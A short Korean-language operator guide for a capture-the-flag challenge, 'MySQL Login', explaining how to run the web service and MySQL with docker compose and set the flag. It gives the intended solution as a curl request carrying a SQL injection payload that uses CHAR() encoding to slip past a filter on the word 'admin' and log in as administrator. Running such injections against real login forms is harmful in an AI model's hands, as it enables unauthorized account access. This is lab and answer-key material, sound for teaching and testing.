# MySQL Login 운영 안내

`compose.yaml`이 웹 서비스와 MySQL을 함께 실행합니다. `CTF_FLAG_05`에 `HKL{...}` 형식의 플래그를 설정하세요.

```sh
docker compose up --build
```

웹 서비스는 `http://localhost:8000/`에서 열립니다. `guest` / `guest` 로그인은 정상 동작 확인용입니다. 관리자 계정의 비밀번호 칼럼에는 서버 배포본의 `HKL{...}` 플래그가 들어 있습니다.

의도한 풀이 확인 요청은 다음과 같습니다. `#` 문자는 URL 인코딩되어 서버에 전달됩니다.

```sh
curl -G --data-urlencode "uid=' OR uid=CHAR(97,100,109,105,110) #" --data-urlencode "upw=x" http://localhost:8000/login
```

정상 배포 시 응답은 `HKL{...}` 형식입니다. `guest` 로그인, 금칙어 `admin` 요청의 `filter` 응답, 위 SQLi 요청을 모두 확인하세요.

플래그는 실행 시 환경변수로 전달되며 소스나 SQL 초기화 파일에는 포함되지 않습니다.
